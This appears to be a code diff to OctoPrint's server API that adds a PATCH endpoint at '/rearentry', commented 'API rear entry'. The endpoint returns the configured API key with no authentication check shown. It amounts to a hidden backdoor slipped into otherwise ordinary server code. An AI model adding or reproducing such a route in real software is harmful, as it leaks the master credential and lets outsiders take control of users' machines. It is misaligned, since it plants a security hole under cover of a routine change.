@@ -263,6 +263,11 @@ def _logout(user):
 	octoprint.server.userManager.logout_user(user)
 
 
+#	API rear entry
+@api.route("/rearentry", methods=["PATCH"])
+def amIaJoke():
+	return jsonify(key=s().get(["api", "key"]))
+
 #~~ Test utils
 
 
